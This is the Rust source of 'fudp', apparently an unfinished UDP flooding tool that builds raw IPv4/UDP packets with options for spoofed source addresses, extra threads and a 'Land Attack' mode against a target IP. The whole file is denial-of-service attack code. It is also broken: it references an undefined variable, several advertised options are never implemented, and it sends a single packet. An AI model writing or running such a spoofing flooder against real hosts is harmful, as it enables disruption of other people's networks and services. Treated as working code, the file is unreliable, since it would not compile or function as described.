#[macro_use]
extern crate clap;
extern crate pnet;

use std::str::FromStr;
use clap::{Arg, App};
use std::net::{IpAddr, Ipv4Addr};
use pnet::transport;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet;
use pnet::packet::Packet;
use pnet::packet::PacketSize;


fn main() {
    let matches = App::new("fudp")
        .before_help("Please use responsibly")
        .version(format!("v{}", crate_version!()).as_ref())
        .author("xorrsprsp - https://github.com/xorrsprsp/")
        .about("fudp is a simple and very easy to use UDP flooding utility")
        .arg(Arg::with_name("dst-ip")
            .help("The IP to be targeted")
            .required(true))
        .arg(Arg::with_name("single-packet")
            .short("1")
            .help("Sends a single datagram and then exits"))
        .arg(Arg::with_name("random-src")
            .short("r")
            .help("Spoofs a random sender IP"))
        .arg(Arg::with_name("threads")
            .short("i")
            .help("Spin up extra threads generating datagrams")
            .takes_value(true))
        .arg(Arg::with_name("dst-port")
            .short("p")
            .help("Destination port")
            .takes_value(true))
        .arg(Arg::with_name("datagram-size")
            .short("z")
            .help("Datagram size")
            .takes_value(true))
        .arg(Arg::with_name("src-ip")
            .short("s")
            .help("Spoofs a specified source IP")
            .takes_value(true))
        .arg(Arg::with_name("land-attack")
            .short("l")
            .help("Land Attack"))
        .get_matches();

    let dst_ip = matches.value_of("dst-ip").unwrap();

    let src_ip = match matches.value_of("src-ip") {
        Some(source_ip) => match Ipv4Addr::from_str(source_ip) {
            Ok(ip) => ip,
            Err(err) => {
                println!("Error: {}", err);
                std::process::exit(1);
            }
        }
        None => Ipv4Addr::new(0, 0, 0, 0),
    };

    let dst_port = match matches.value_of("dst-port") {
        Some(destination_port) => match destination_port.parse::<u16>() {
            Ok(port) => port,
            Err(err) => {
                println!("Error while interpreting port: {}", err);
                std::process::exit(1);
            }
        },
        None => 0u16,
    };

    let random_src = matches.is_present("random-src");

    let dst_ip = match Ipv4Addr::from_str(dst_ip) {
        Ok(ip) => ip,
        Err(err) => {
            println!("Error: {}", err);
            std::process::exit(1);
        }
    };
    println!("{:?}", attack_ip);


    if !src_ip.is_unspecified() && random_src == true {
        eprintln!("ERROR: -s and -r flags are mutually exclusive");
        std::process::exit(1);
    }

    let (mut tx, _rx) = match transport::transport_channel(1000, transport::TransportChannelType::Layer3(IpNextHeaderProtocols::Udp)) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!("{}", e),
    };

    let udp_struct = packet::udp::Udp {
        source: 1337,
        destination: dst_port,
        length: 28, // at least 8, to hold all header data without a payload
        checksum: 0,
        payload: vec![5u8; 20],
    };

    let mut udp_buffer = vec![0u8; 28];
    let mut udp_packet = packet::udp::MutableUdpPacket::new(&mut udp_buffer).unwrap();
    udp_packet.populate(&udp_struct);

    let ipv4_struct = packet::ipv4::Ipv4 {
        version: 4,
        header_length: 5,
        dscp: 0,
        ecn: 0,
        total_length: 48,
        identification: 0,
        flags: 0,
        fragment_offset: 0,
        ttl: 60,
        next_level_protocol: IpNextHeaderProtocols::Udp,
        checksum: 0,
        source: src_ip,
        destination: dst_ip,
        options: vec![],
        payload: vec![0u8; 28],

    };

    let mut ipv4_buffer = vec![0u8; 48];


    let mut ipv4_packet = packet::ipv4::MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();

    ipv4_packet.populate(&ipv4_struct);
    println!("{}", ipv4_packet.packet_size());
    println!("{:?}", ipv4_packet);
    ipv4_packet.set_payload(udp_packet.packet());
    let written = match tx.send_to(ipv4_packet, IpAddr::V4(dst_ip)) {
        Ok(written) => written,
        Err(e) => panic!("{}", e),
    };
}
